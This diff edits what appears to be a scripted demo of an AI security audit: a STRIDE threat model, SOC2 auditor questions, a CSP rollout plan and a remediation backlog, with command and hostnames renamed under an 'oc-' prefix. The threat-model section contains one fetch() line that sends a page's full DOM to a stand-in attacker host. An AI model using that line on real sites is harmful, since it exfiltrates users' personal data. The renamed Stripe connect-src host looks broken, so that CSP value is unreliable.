@@ -157,7 +157,7 @@ Three trust boundaries:
   1. Inject a script payload via the vulnerable surface.
   2. Without CSP, the injected script runs with full DOM access.
   3. The script reads the session cookie via JS (note: \`HttpOnly\` prevents JS cookie access, so the attacker pivots to exfiltrating page contents instead).
-  4. \`fetch('https://api.attacker.com/log', {body: document.documentElement.innerHTML})\` — full DOM, including any rendered PII.
+  4. \`fetch('https://oc-api.attacker.com/log', {body: document.documentElement.innerHTML})\` — full DOM, including any rendered PII.
 - **Defender's observation:** **none, today.** Post-CSP: \`/csp-report\` endpoint fires; Sentry tags the violation; dashboards show.
 - **Blast radius:** scoped to what the victim sees on the page they're on; combined with #1, can become tenant-wide.
 - **Time-to-detect:** post-CSP, **seconds** (CSP violation report fires synchronously with the blocked script execution).
@@ -235,7 +235,7 @@ Eight questions a SOC2 Type I auditor will ask in the first 30 minutes, with can
 
 1. **"Do you have a documented threat model?"** Yes — this document, committed to \`docs/security/threat-model.md\`. Last reviewed: today. Review cadence: quarterly.
 2. **"How do you enforce tenant isolation in the database?"** Postgres Row-Level Security policies on every tenant-scoped table, enforced via per-request JWT (post-remediation B-1). Evidence: \`bin/audit/rls-coverage.sh\` reports 100% coverage; integration test \`tests/security/cross-tenant.spec.ts\` asserts cross-tenant query returns 0 rows.
-3. **"Show me your CSP."** Header is \`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...' https://js.stripe.com; ...\` — enforce after 7-day report-only soak (post-remediation B-2). Evidence: curl headers on \`https://app.example.com\` after enforcement.
+3. **"Show me your CSP."** Header is \`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...' https://js.stripe.com; ...\` — enforce after 7-day report-only soak (post-remediation B-2). Evidence: curl headers on \`https://oc-app.example.com\` after enforcement.
 4. **"How are admin actions logged?"** Every admin action writes to \`admin_audit_log\` with actor, target, before/after state, IP, UA (post-remediation C-3). 7-year retention. Evidence: schema + sample query against a known admin event.
 5. **"What's your incident-response plan?"** \`docs/runbooks/incident-response.md\` — paging, comms, postmortem template. Drill quarterly. Evidence: last drill report dated 2026-04-18.
 6. **"How do you manage subprocessors?"** \`docs/security/subprocessors.md\` — list, BAA/DPA status, last review date. Evidence: signed DPAs for Cloudflare, Vercel, Supabase, Stripe, Sentry on file (H-2).
@@ -265,7 +265,7 @@ Content-Security-Policy-Report-Only:
   script-src 'self' 'nonce-{{nonce}}' https://cdn.stripe.com;
   style-src 'self' 'nonce-{{nonce}}';
   img-src 'self' data: https://*.supabase.co;
-  connect-src 'self' https://api.stripe.com https://*.supabase.co wss://*.supabase.co;
+  connect-src 'self' https://oc-api.stripe.com https://*.supabase.co wss://*.supabase.co;
   frame-src https://js.stripe.com https://hooks.stripe.com;
   base-uri 'self';
   form-action 'self';
@@ -295,7 +295,7 @@ export function middleware(req: NextRequest) {
     \`script-src 'self' 'nonce-\${nonce}' https://cdn.stripe.com\`,
     \`style-src 'self' 'nonce-\${nonce}'\`,
     "img-src 'self' data: https://*.supabase.co",
-    "connect-src 'self' https://api.stripe.com https://*.supabase.co wss://*.supabase.co",
+    "connect-src 'self' https://oc-api.stripe.com https://*.supabase.co wss://*.supabase.co",
     "frame-src https://js.stripe.com https://hooks.stripe.com",
     "base-uri 'self'",
     "form-action 'self'",
@@ -374,7 +374,7 @@ After 7 days with zero unexplained violation reports:
 
 1. Change header name to \`Content-Security-Policy\` (drop \`-Report-Only\`).
 2. Keep \`report-uri\` for ongoing visibility.
-3. Re-run the \`/secaudit\` pass; expect Finding #2 to flip to GREEN.
+3. Re-run the \`/oc-secaudit\` pass; expect Finding #2 to flip to GREEN.
 
 ### 1.4 Known false-positive surfaces (to whitelist or fix)
 
@@ -553,11 +553,11 @@ Every admin route entry-point calls \`logAdminAction\` after the action settles 
 Each item has a **verify** step that confirms the change actually landed in prod:
 
 - [ ] Add CSP middleware + nonce plumbing (1 day).
-  - **verify:** \`curl -I https://app.example.com | grep -i content-security-policy-report-only\` shows the header.
+  - **verify:** \`curl -I https://oc-app.example.com | grep -i content-security-policy-report-only\` shows the header.
 - [ ] Set \`/csp-report\` route + Sentry forwarding (30 min).
   - **verify:** POST a synthetic violation; Sentry issue auto-opens within 1 min.
 - [ ] Toggle CF SSL Mode → strict (5 min).
-  - **verify:** \`curl -fsSI https://app.example.com\` succeeds with the prod cert (no fallback to self-signed origin cert observable in CF SSL/TLS overview).
+  - **verify:** \`curl -fsSI https://oc-app.example.com\` succeeds with the prod cert (no fallback to self-signed origin cert observable in CF SSL/TLS overview).
 - [ ] Toggle CF Min TLS → 1.2 (5 min).
   - **verify:** \`openssl s_client -tls1_1 -connect app.example.com:443 < /dev/null\` is refused.
 - [ ] Set HSTS via CF dashboard (10 min).
@@ -673,13 +673,13 @@ Checkpoint: \`.checkpoints/oc-security-auditor.checkpoint.json\` (Phase 3).`,
   - [ ] Per-request nonce inherited by every \`<script>\` and \`<style>\` tag rendered through the app.
   - [ ] \`/csp-report\` endpoint accepts violations and forwards to Sentry.
   - [ ] After 7-day soak with zero unexplained violations: flip to \`Content-Security-Policy\` (enforce).
-  - [ ] Re-run \`/secaudit\` → Finding #2 status flips to GREEN.
+  - [ ] Re-run \`/oc-secaudit\` → Finding #2 status flips to GREEN.
 - **Regression test:** \`tests/security/csp.spec.ts\` — 3 tests covering nonce presence, inline-script block, report endpoint shape.
 - **Rollback:** flip \`CSP_ENFORCE=false\` env var; redeploy. < 5 min. Reverts to report-only. Reverting the middleware itself is < 10 min via PR revert; either rollback path is safe.
 - **Verification artifact:** Sentry tag \`csp_violation\` count over the 7-day soak window; expected 0 unexplained.
 - **Verification:** oc-security-auditor re-scan after enforcement day; \`/csp-report\` log shows zero unexplained violations.
 - **Est:** 1 day initial + 7-day soak + 1 day enforcement.
-- **Done when:** header is \`Content-Security-Policy\` (not \`-Report-Only\`); /secaudit re-scan flips Finding #2 to GREEN.
+- **Done when:** header is \`Content-Security-Policy\` (not \`-Report-Only\`); /oc-secaudit re-scan flips Finding #2 to GREEN.
 
 ### B-3 — Strip stack traces from production 500s
 
@@ -692,7 +692,7 @@ Checkpoint: \`.checkpoints/oc-security-auditor.checkpoint.json\` (Phase 3).`,
   - [ ] Server log retains the full trace, searchable by digest.
 - **Regression test:** \`tests/security/no-stack-trace-in-500.spec.ts\` — fires a synthetic 500, asserts response body matches the clean template.
 - **Rollback:** revert PR; redeploy. < 10 min. No user impact.
-- **Verification artifact:** PR review + \`curl -fsS https://app.example.com/__force_500__ | wc -c\` returns < 1KB.
+- **Verification artifact:** PR review + \`curl -fsS https://oc-app.example.com/__force_500__ | wc -c\` returns < 1KB.
 - **Est:** 2 hours.
 
 ## 3. CC6 findings (should fix before audit)
@@ -721,7 +721,7 @@ Checkpoint: \`.checkpoints/oc-security-auditor.checkpoint.json\` (Phase 3).`,
   - Min TLS Version: 1.0 → 1.2.
   - HSTS: \`max-age=63072000; includeSubDomains; preload\`.
 - **Acceptance criteria:**
-  - [ ] \`curl -fsSI https://app.example.com\` shows \`strict-transport-security: max-age=63072000; includeSubDomains; preload\`.
+  - [ ] \`curl -fsSI https://oc-app.example.com\` shows \`strict-transport-security: max-age=63072000; includeSubDomains; preload\`.
   - [ ] \`openssl s_client -tls1_1 -connect app.example.com:443 < /dev/null\` is refused.
   - [ ] CF SSL/TLS Overview shows mode "Full (strict)" with a valid origin cert chain.
 - **Regression test:** \`tests/security/tls-config.spec.ts\` polls every prod deploy and asserts headers match expectation; alerts on drift.
@@ -781,7 +781,7 @@ Checkpoint: \`.checkpoints/oc-security-auditor.checkpoint.json\` (Phase 3).`,
 
 ### H-3 — Quarterly security review cadence
 
-- **Fix:** add a recurring calendar entry for \`/secaudit\` re-run every 90 days.
+- **Fix:** add a recurring calendar entry for \`/oc-secaudit\` re-run every 90 days.
 - **Est:** 5 minutes.
 
 ## 6. Sprint proposal
@@ -790,7 +790,7 @@ Checkpoint: \`.checkpoints/oc-security-auditor.checkpoint.json\` (Phase 3).`,
 Sprint A (this week)       B-1, B-2 (report-only), B-3, C-1, C-2     ~3 days work
 Sprint B (next week)       B-2 (enforce), C-3, D-1, D-2, D-3, D-4    ~2 days work
 Hygiene (ongoing)          H-1, H-2, H-3 (mostly docs)               ~1 hour
-Re-audit                   /secaudit after each sprint               separate cadence
+Re-audit                   /oc-secaudit after each sprint               separate cadence
 Pen-test                   external; book after Sprint B closes      separate engagement
 \`\`\`
 
@@ -880,7 +880,7 @@ What's going to fail when the auditor looks?`
     {
       type: "exchange", role: "claude", skill: "oc-security-auditor",
       content:
-`Invoking **oc-security-auditor** in \`/secaudit\` mode. Four-stage sweep:
+`Invoking **oc-security-auditor** in \`/oc-secaudit\` mode. Four-stage sweep:
 
 1. **Threat model** — STRIDE per trust boundary, OWASP mapping.
 2. **Attack-surface map** — every externally-reachable endpoint + what it trusts.
@@ -927,7 +927,7 @@ Writing \`.checkpoints/oc-security-auditor.checkpoint.json\`.`,
     {
       type: "exchange", role: "claude", skill: "oc-code-auditor",
       content:
-`Invoked by oc-security-auditor for the code-level sweep underneath Finding #1. Running \`/audit security\` with a narrow scope: every call-site of the Supabase client.
+`Invoked by oc-security-auditor for the code-level sweep underneath Finding #1. Running \`/oc-audit security\` with a narrow scope: every call-site of the Supabase client.
 
 \`\`\`
  files scanned       147 (TS/TSX)
@@ -987,10 +987,10 @@ Writing the hardening plan.`,
     {
       type: "exchange", role: "claude", skill: "oc-security-auditor",
       content:
-`I update the **oc-deploy-ops** gate to require a passing oc-security-auditor check before any prod deploy. From now on, \`/deploy prod\` runs:
+`I update the **oc-deploy-ops** gate to require a passing oc-security-auditor check before any prod deploy. From now on, \`/oc-deploy prod\` runs:
 
-1. \`oc-code-auditor /audit pre-deploy\` — code-level findings.
-2. \`oc-security-auditor /sec verify\` — re-scans the top-8 STRIDE findings; any still RED blocks the deploy.
+1. \`oc-code-auditor /oc-audit pre-deploy\` — code-level findings.
+2. \`oc-security-auditor /oc-sec verify\` — re-scans the top-8 STRIDE findings; any still RED blocks the deploy.
 3. \`oc-deploy-ops\` gate proceeds only when both pass.
 
 Remediation backlog is ranked for a two-sprint burn:
@@ -1000,7 +1000,7 @@ Remediation backlog is ranked for a two-sprint burn:
 
 Each goes through the normal oc-app-architect build loop — oc-code-auditor + oc-security-auditor + oc-deploy-ops chain on every sprint. No one-off patches.
 
-Re-run \`/secaudit\` after Sprint A; I'll re-score and show you what moved.`,
+Re-run \`/oc-secaudit\` after Sprint A; I'll re-score and show you what moved.`,
       artifacts: ["remediation-backlog"],
     },
     {
